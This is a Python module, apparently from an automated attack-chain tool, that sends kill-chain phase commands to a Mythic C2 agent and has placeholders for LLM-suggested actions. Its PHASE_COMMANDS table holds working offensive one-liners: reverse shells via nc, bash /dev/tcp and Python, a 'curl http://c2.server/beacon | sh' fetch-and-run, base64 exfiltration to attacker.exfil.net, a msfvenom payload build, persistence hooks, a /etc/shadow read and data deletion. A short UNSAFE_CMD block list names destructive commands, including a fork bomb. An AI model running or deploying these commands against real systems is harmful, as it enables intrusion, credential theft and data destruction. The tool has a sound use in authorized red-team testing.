"""
module for processing commands in the context of a chain,
based on doc https://www.unifiedkillchain.com/assets/The-Unified-Kill-Chain.pdf
"""
from app.cmd.c2_tool import execute_local_command, check_status
from app.models import AttackStep


UNSAFE_CMD = ["rm -fr /", "dd if=/dev/zero of=", "chown -R root:root /",
              "rm -rf /", ":(){ :|:& };:", "rm -rf *"]

phases = ("Reconnaissance", "Resource Development",
          "Delivery", "Social Engineering",
          "Exploitation", "Persistence", "Defense Evasion",
          "Command & Control", "Pivoting", "Discovery",
          "Privilege Escalation", "Execution", "Credential Access",
          "Lateral Movement", "Collection", "Exfiltration",
          "Impact", "Objectives")

PHASE_COMMANDS = {
    "Reconnaissance": [
        "nmap -sn <target>",
        "whois <domain>",
        "nslookup <domain>",
        "dig <domain>",
    ],
    "Resource Development": [
        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o payload.exe",
        "python3 -m http.server 8000",
    ],
    "Delivery": [
        "curl -T payload.exe ftp://<ip>/uploads/",
        "smbclient //target/share -U user%pass -c 'put payload.exe'",
    ],
    "Social Engineering": [
        "swaks --to user@example.com --from admin@example.com --server smtp.example.com --body 'Click here: http://evil.com'",
    ],
    "Exploitation": [
        "msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; run'",
        "sqlmap -u 'http://target/vuln.php?id=1' --batch --dump",
    ],
    "Persistence": [
        "crontab -l && echo '*/5 * * * * /tmp/payload' | crontab -",
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d \"C:\\Users\\Public\\payload.exe\"",
    ],
    "Defense Evasion": [
        "upx payload.exe",
        "chattr +i /tmp/hidden_file",
    ],
    "Command & Control": [
        "nc -e /bin/sh <ip> <port>",
        "curl -s http://c2.server/beacon | sh",
    ],
    "Pivoting": [
        "ssh -D 9090 user@pivot-host",
        "proxychains nmap -sT -Pn 192.168.1.0/24",
    ],
    "Discovery": [
        "ps aux",
        "netstat -tulnp",
        "cat /etc/passwd",
        "arp -a",
    ],
    "Privilege Escalation": [
        "sudo -l",
        "find / -perm -4000 2>/dev/null",
        "cat /etc/shadow",
    ],
    "Execution": [
        "bash -i >& /dev/tcp/<ip>/<port> 0>&1",
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<ip>\",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
    ],
    "Credential Access": [
        "mimikatz.exe",
        "hashcat -m 1000 hashes.txt wordlist.txt",
    ],
    "Lateral Movement": [
        "psexec.py user@target 'cmd.exe'",
        "evil-winrm -i <ip> -u user -p pass",
    ],
    "Collection": [
        "tar czf /tmp/data.tar.gz /home/user/Documents/",
        "find / -name \"*.docx\" -type f 2>/dev/null",
    ],
    "Exfiltration": [
        "scp /tmp/data.tar.gz user@remote:/tmp/",
        "base64 /tmp/data.tar.gz | curl -X POST -d @- http://attacker.exfil.net",
    ],
    "Impact": [
        "rm -rf /important/data",
        "shutdown -h now",
    ],
    "Objectives": [
        "cat /flag.txt",
        "echo 'Mission Complete' > /root/success.log",
    ],
}


async def init_zero_agent():
    """ generate payload ->
        download by mythic_payload_uuid ->
        run via subprocess.run, save mythic agent info to db
        save Resource Development info to AttackStep"""
    pass


async def get_agent_status(callback_display_id):
    """ maybe process status, like if fail -> restart agent in chain """
    status = await check_status(callback_display_id)
    return status


async def check_and_process_local_cmd(
    cmd: str, c_display_id: int, chain_id: int, phase_name: str
) -> AttackStep:
    """ async function for check is safe command ->
        execute on zero agent, formatting to AttackStep """
    assert cmd not in UNSAFE_CMD
    # phase even for local command depends on current or recon
    assert is_command_allowed_in_phase(
        cmd, phase_name
    ), f"Command not allowed in phase {phase_name}"
    # send command to C2
    output, myth_t_id, myth_p_id, myth_p_uuid = await execute_local_command(
        cmd, c_display_id
        )
    # TODO: send output to LLM
    attack_step = AttackStep(
        chain_id=chain_id,
        phase=phase_name,
        tool_name=cmd.split()[0],
        command=cmd,
        mythic_task_id=myth_t_id,
        mythic_payload_uuid=myth_p_uuid,
        mythic_payload_id=myth_p_id,
        raw_log=output,
        status="success"
    )
    return attack_step


def is_command_allowed_in_phase(cmd: str, phase_name: str) -> bool:
    """ check command for allowed, we dont want to ransomware """
    allowed_commands = get_commands_for_phase(phase_name)
    # Можно сделать частичное совпадение или регулярки
    return any(
        cmd.strip().startswith(
            allowed.split()[0]
        ) for allowed in allowed_commands
    )


def get_commands_for_phase(phase_name: str):
    """ get spicific command for phase, format """
    return PHASE_COMMANDS.get(phase_name, [])


async def suggest_actions_for_phase(phase_name: str) -> list[str]:
    """Return list of suggested commands for given phase"""
    return get_commands_for_phase(phase_name)


async def generate_action_suggestions_with_llm(phase_name: str, context_summary: str = ""):
    """Use LLM to refine suggestions based on summary or logs"""
    # TODO: вызвать модель, передать ей фазу и контекст
    pass
